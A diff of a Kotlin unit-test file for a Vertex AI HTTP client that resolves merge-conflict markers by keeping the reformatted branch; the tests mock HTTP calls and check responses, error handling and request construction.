@@ -1,22 +1,6 @@
 package dev.aurakai.auraframefx.ai.clients
 
 import io.mockk.*
-<<<<<<< HEAD
-import kotlinx.coroutines.runBlocking
-import kotlinx.coroutines.test.runTest
-import org.junit.jupiter.api.*
-import org.junit.jupiter.api.Assertions.*
-import org.junit.jupiter.params.ParameterizedTest
-import org.junit.jupiter.params.provider.CsvSource
-import org.junit.jupiter.params.provider.EmptySource
-import org.junit.jupiter.params.provider.NullSource
-import org.junit.jupiter.params.provider.ValueSource
-import java.io.IOException
-import java.net.ConnectException
-import java.net.http.HttpClient
-import java.net.http.HttpRequest
-import java.net.http.HttpResponse
-=======
 import org.junit.jupiter.api.*
 import org.junit.jupiter.api.Assertions.*
 import org.junit.jupiter.params.ParameterizedTest
@@ -31,7 +15,6 @@ import java.net.http.HttpClient
 import java.net.http.HttpRequest
 import java.net.http.HttpResponse
 import java.net.ConnectException
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 import java.util.concurrent.TimeoutException
 
 @TestInstance(TestInstance.Lifecycle.PER_CLASS)
@@ -40,11 +23,7 @@ class VertexAIClientImplTest {
     private lateinit var httpClient: HttpClient
     private lateinit var vertexAIClient: VertexAIClientImpl
     private lateinit var mockResponse: HttpResponse<String>
-<<<<<<< HEAD
-
-=======
     
->>>>>>> origin/coderabbitai/docstrings/78f34ad
     private val validApiKey = "test-api-key"
     private val validProjectId = "test-project-id"
     private val validLocation = "us-central1"
@@ -135,30 +114,12 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(prompt, validModel)
 
             assertEquals("Generated response", result)
-<<<<<<< HEAD
-            coVerify {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            }
-=======
             coVerify { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) }
->>>>>>> origin/coderabbitai/docstrings/78f34ad
         }
 
         @Test
@@ -173,16 +134,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns emptyResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(prompt, validModel)
 
@@ -197,16 +149,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns malformedJson
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             assertThrows<RuntimeException> {
                 runBlocking { vertexAIClient.generateContent(prompt, validModel) }
@@ -235,16 +178,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns statusCode
             every { mockResponse.body() } returns errorResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             assertThrows<RuntimeException> {
                 runBlocking { vertexAIClient.generateContent(prompt, validModel) }
@@ -255,18 +189,8 @@ class VertexAIClientImplTest {
         @DisplayName("Should handle network timeout")
         fun `should handle network timeout`() = runTest {
             val prompt = "Test prompt"
-<<<<<<< HEAD
-
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } throws TimeoutException("Request timed out")
-=======
             
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } throws TimeoutException("Request timed out")
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             assertThrows<TimeoutException> {
                 runBlocking { vertexAIClient.generateContent(prompt, validModel) }
@@ -277,18 +201,8 @@ class VertexAIClientImplTest {
         @DisplayName("Should handle connection failure")
         fun `should handle connection failure`() = runTest {
             val prompt = "Test prompt"
-<<<<<<< HEAD
-
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } throws ConnectException("Connection refused")
-=======
             
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } throws ConnectException("Connection refused")
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             assertThrows<ConnectException> {
                 runBlocking { vertexAIClient.generateContent(prompt, validModel) }
@@ -299,18 +213,8 @@ class VertexAIClientImplTest {
         @DisplayName("Should handle IO exception")
         fun `should handle IO exception`() = runTest {
             val prompt = "Test prompt"
-<<<<<<< HEAD
-
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } throws IOException("IO error")
-=======
             
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } throws IOException("IO error")
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             assertThrows<IOException> {
                 runBlocking { vertexAIClient.generateContent(prompt, validModel) }
@@ -361,30 +265,12 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(longPrompt, validModel)
 
             assertEquals("Response to long prompt", result)
-<<<<<<< HEAD
-            coVerify {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            }
-=======
             coVerify { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) }
->>>>>>> origin/coderabbitai/docstrings/78f34ad
         }
 
         @Test
@@ -409,16 +295,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(specialPrompt, validModel)
 
@@ -447,16 +324,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(unicodePrompt, validModel)
 
@@ -490,40 +358,17 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-
-            val requestSlot = slot<HttpRequest>()
-            coEvery {
-                httpClient.send(
-                    capture(requestSlot),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             
             val requestSlot = slot<HttpRequest>()
             coEvery { httpClient.send(capture(requestSlot), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             vertexAIClient.generateContent(prompt, validModel)
 
             val capturedRequest = requestSlot.captured
             assertTrue(capturedRequest.headers().firstValue("Authorization").isPresent)
-<<<<<<< HEAD
-            assertEquals(
-                "Bearer $validApiKey",
-                capturedRequest.headers().firstValue("Authorization").get()
-            )
-            assertTrue(capturedRequest.headers().firstValue("Content-Type").isPresent)
-            assertEquals(
-                "application/json",
-                capturedRequest.headers().firstValue("Content-Type").get()
-            )
-=======
             assertEquals("Bearer $validApiKey", capturedRequest.headers().firstValue("Authorization").get())
             assertTrue(capturedRequest.headers().firstValue("Content-Type").isPresent)
             assertEquals("application/json", capturedRequest.headers().firstValue("Content-Type").get())
->>>>>>> origin/coderabbitai/docstrings/78f34ad
         }
 
         @Test
@@ -548,30 +393,14 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-
-            val requestSlot = slot<HttpRequest>()
-            coEvery {
-                httpClient.send(
-                    capture(requestSlot),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             
             val requestSlot = slot<HttpRequest>()
             coEvery { httpClient.send(capture(requestSlot), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             vertexAIClient.generateContent(prompt, validModel)
 
             val capturedRequest = requestSlot.captured
-<<<<<<< HEAD
-            val expectedUrl =
-                "https://$validLocation-aiplatform.googleapis.com/v1/projects/$validProjectId/locations/$validLocation/publishers/google/models/$validModel:generateContent"
-=======
             val expectedUrl = "https://$validLocation-aiplatform.googleapis.com/v1/projects/$validProjectId/locations/$validLocation/publishers/google/models/$validModel:generateContent"
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             assertEquals(expectedUrl, capturedRequest.uri().toString())
         }
 
@@ -597,31 +426,16 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-
-            val requestSlot = slot<HttpRequest>()
-            coEvery {
-                httpClient.send(
-                    capture(requestSlot),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             
             val requestSlot = slot<HttpRequest>()
             coEvery { httpClient.send(capture(requestSlot), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             vertexAIClient.generateContent(prompt, validModel)
 
             val capturedRequest = requestSlot.captured
             val bodyPublisher = capturedRequest.bodyPublisher()
             assertTrue(bodyPublisher.isPresent)
-<<<<<<< HEAD
-
-=======
             
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             // The body should contain the structured request with the prompt
             // This is a simplified check - in practice, you'd want to parse the JSON
             // and verify the structure more thoroughly
@@ -654,16 +468,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns response
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(prompt, validModel)
 
@@ -701,16 +506,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns response
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(prompt, validModel)
 
@@ -742,16 +538,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns response
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(prompt, validModel)
 
@@ -783,16 +570,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns response
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(prompt, validModel)
 
@@ -811,16 +589,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns null
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             assertThrows<RuntimeException> {
                 runBlocking { vertexAIClient.generateContent(prompt, validModel) }
@@ -839,16 +608,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns invalidStructure
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(prompt, validModel)
 
@@ -867,16 +627,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns response
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(prompt, validModel)
 
@@ -921,32 +672,14 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returnsMany listOf(response1, response2)
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result1 = vertexAIClient.generateContent(prompt1, validModel)
             val result2 = vertexAIClient.generateContent(prompt2, validModel)
 
             assertEquals("Response 1", result1)
             assertEquals("Response 2", result2)
-<<<<<<< HEAD
-            coVerify(exactly = 2) {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            }
-=======
             coVerify(exactly = 2) { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) }
->>>>>>> origin/coderabbitai/docstrings/78f34ad
         }
     }
 
@@ -976,32 +709,14 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             repeat(10) {
                 val result = vertexAIClient.generateContent(prompt, validModel)
                 assertEquals("Generated response", result)
             }
 
-<<<<<<< HEAD
-            coVerify(exactly = 10) {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            }
-=======
             coVerify(exactly = 10) { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) }
->>>>>>> origin/coderabbitai/docstrings/78f34ad
         }
 
         @Test
@@ -1026,16 +741,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             val result = vertexAIClient.generateContent(largePrompt, validModel)
 
@@ -1070,32 +776,14 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             models.forEach { model ->
                 val result = vertexAIClient.generateContent(prompt, model)
                 assertEquals("Model response", result)
             }
 
-<<<<<<< HEAD
-            coVerify(exactly = models.size) {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            }
-=======
             coVerify(exactly = models.size) { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) }
->>>>>>> origin/coderabbitai/docstrings/78f34ad
         }
 
         @Test
@@ -1121,16 +809,7 @@ class VertexAIClientImplTest {
 
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
-<<<<<<< HEAD
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-=======
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 
             locations.forEach { location ->
                 val client = VertexAIClientImpl(httpClient, validApiKey, validProjectId, location)
@@ -1138,27 +817,6 @@ class VertexAIClientImplTest {
                 assertEquals("Location response", result)
             }
 
-<<<<<<< HEAD
-            coVerify(exactly = locations.size) {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            }
-        }
-    }
-}
-
-@Nested
-@DisplayName("Advanced Error Handling Tests")
-inner class AdvancedErrorHandlingTests {
-
-    @Test
-    @DisplayName("Should handle rate limiting with 429 status code")
-    fun `should handle rate limiting with 429 status code`() = runTest {
-        val prompt = "Test prompt"
-        val rateLimitResponse = """
-=======
             coVerify(exactly = locations.size) { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) }
         }
     }
@@ -1172,7 +830,6 @@ inner class AdvancedErrorHandlingTests {
         fun `should handle rate limiting with 429 status code`() = runTest {
             val prompt = "Test prompt"
             val rateLimitResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "error": {
                         "code": 429,
@@ -1186,27 +843,6 @@ inner class AdvancedErrorHandlingTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 429
-        every { mockResponse.body() } returns rateLimitResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        assertThrows<RuntimeException> {
-            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
-        }
-    }
-
-    @Test
-    @DisplayName("Should handle quota exceeded error")
-    fun `should handle quota exceeded error`() = runTest {
-        val prompt = "Test prompt"
-        val quotaResponse = """
-=======
             every { mockResponse.statusCode() } returns 429
             every { mockResponse.body() } returns rateLimitResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1221,7 +857,6 @@ inner class AdvancedErrorHandlingTests {
         fun `should handle quota exceeded error`() = runTest {
             val prompt = "Test prompt"
             val quotaResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "error": {
                         "code": 403,
@@ -1235,27 +870,6 @@ inner class AdvancedErrorHandlingTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 403
-        every { mockResponse.body() } returns quotaResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        assertThrows<RuntimeException> {
-            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
-        }
-    }
-
-    @Test
-    @DisplayName("Should handle authentication token expiration")
-    fun `should handle authentication token expiration`() = runTest {
-        val prompt = "Test prompt"
-        val authErrorResponse = """
-=======
             every { mockResponse.statusCode() } returns 403
             every { mockResponse.body() } returns quotaResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1270,7 +884,6 @@ inner class AdvancedErrorHandlingTests {
         fun `should handle authentication token expiration`() = runTest {
             val prompt = "Test prompt"
             val authErrorResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "error": {
                         "code": 401,
@@ -1284,27 +897,6 @@ inner class AdvancedErrorHandlingTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 401
-        every { mockResponse.body() } returns authErrorResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        assertThrows<RuntimeException> {
-            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
-        }
-    }
-
-    @Test
-    @DisplayName("Should handle server overload with 503 status")
-    fun `should handle server overload with 503 status`() = runTest {
-        val prompt = "Test prompt"
-        val overloadResponse = """
-=======
             every { mockResponse.statusCode() } returns 401
             every { mockResponse.body() } returns authErrorResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1319,7 +911,6 @@ inner class AdvancedErrorHandlingTests {
         fun `should handle server overload with 503 status`() = runTest {
             val prompt = "Test prompt"
             val overloadResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "error": {
                         "code": 503,
@@ -1333,72 +924,6 @@ inner class AdvancedErrorHandlingTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 503
-        every { mockResponse.body() } returns overloadResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        assertThrows<RuntimeException> {
-            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
-        }
-    }
-
-    @Test
-    @DisplayName("Should handle interrupted exception during request")
-    fun `should handle interrupted exception during request`() = runTest {
-        val prompt = "Test prompt"
-
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } throws InterruptedException("Thread interrupted")
-
-        assertThrows<InterruptedException> {
-            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
-        }
-    }
-
-    @Test
-    @DisplayName("Should handle security exception")
-    fun `should handle security exception`() = runTest {
-        val prompt = "Test prompt"
-
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } throws SecurityException("Security violation")
-
-        assertThrows<SecurityException> {
-            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
-        }
-    }
-}
-
-@Nested
-@DisplayName("Request Validation Tests")
-inner class RequestValidationTests {
-
-    @Test
-    @DisplayName("Should validate model name format")
-    fun `should validate model name format`() = runTest {
-        val prompt = "Test prompt"
-        val invalidModels = listOf("invalid/model", "model with spaces", "model@special")
-
-        invalidModels.forEach { invalidModel ->
-            // Assuming the implementation validates model names
-            // This would need to be adjusted based on actual validation logic
-            assertDoesNotThrow {
-                runBlocking { vertexAIClient.generateContent(prompt, invalidModel) }
-=======
             every { mockResponse.statusCode() } returns 503
             every { mockResponse.body() } returns overloadResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1429,20 +954,10 @@ inner class RequestValidationTests {
 
             assertThrows<SecurityException> {
                 runBlocking { vertexAIClient.generateContent(prompt, validModel) }
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             }
         }
     }
 
-<<<<<<< HEAD
-    @Test
-    @DisplayName("Should handle extremely long model names")
-    fun `should handle extremely long model names`() = runTest {
-        val prompt = "Test prompt"
-        val longModel = "a".repeat(1000)
-
-        val expectedResponse = """
-=======
     @Nested
     @DisplayName("Request Validation Tests")
     inner class RequestValidationTests {
@@ -1469,7 +984,6 @@ inner class RequestValidationTests {
             val longModel = "a".repeat(1000)
             
             val expectedResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -1485,30 +999,6 @@ inner class RequestValidationTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns expectedResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        assertDoesNotThrow {
-            runBlocking { vertexAIClient.generateContent(prompt, longModel) }
-        }
-    }
-
-    @Test
-    @DisplayName("Should validate project ID format")
-    fun `should validate project ID format`() = runTest {
-        val invalidProjectIds = listOf("project_with_underscores", "project-with-$pecial", "")
-
-        invalidProjectIds.forEach { invalidProjectId ->
-            assertThrows<IllegalArgumentException> {
-                VertexAIClientImpl(httpClient, validApiKey, invalidProjectId, validLocation)
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1539,35 +1029,10 @@ inner class RequestValidationTests {
                 assertThrows<IllegalArgumentException> {
                     VertexAIClientImpl(httpClient, validApiKey, validProjectId, invalidLocation)
                 }
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             }
         }
     }
 
-<<<<<<< HEAD
-    @Test
-    @DisplayName("Should validate location format")
-    fun `should validate location format`() = runTest {
-        val invalidLocations = listOf("invalid_location", "location with spaces", "UPPERCASE")
-
-        invalidLocations.forEach { invalidLocation ->
-            assertThrows<IllegalArgumentException> {
-                VertexAIClientImpl(httpClient, validApiKey, validProjectId, invalidLocation)
-            }
-        }
-    }
-}
-
-@Nested
-@DisplayName("Response Content Variation Tests")
-inner class ResponseContentVariationTests {
-
-    @Test
-    @DisplayName("Should handle response with safety ratings")
-    fun `should handle response with safety ratings`() = runTest {
-        val prompt = "Test prompt"
-        val responseWithSafety = """
-=======
     @Nested
     @DisplayName("Response Content Variation Tests")
     inner class ResponseContentVariationTests {
@@ -1577,7 +1042,6 @@ inner class ResponseContentVariationTests {
         fun `should handle response with safety ratings`() = runTest {
             val prompt = "Test prompt"
             val responseWithSafety = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -1599,26 +1063,6 @@ inner class ResponseContentVariationTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns responseWithSafety
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        val result = vertexAIClient.generateContent(prompt, validModel)
-        assertEquals("Safe response", result)
-    }
-
-    @Test
-    @DisplayName("Should handle response with finish reason")
-    fun `should handle response with finish reason`() = runTest {
-        val prompt = "Test prompt"
-        val responseWithFinishReason = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns responseWithSafety
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1632,7 +1076,6 @@ inner class ResponseContentVariationTests {
         fun `should handle response with finish reason`() = runTest {
             val prompt = "Test prompt"
             val responseWithFinishReason = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -1649,26 +1092,6 @@ inner class ResponseContentVariationTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns responseWithFinishReason
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
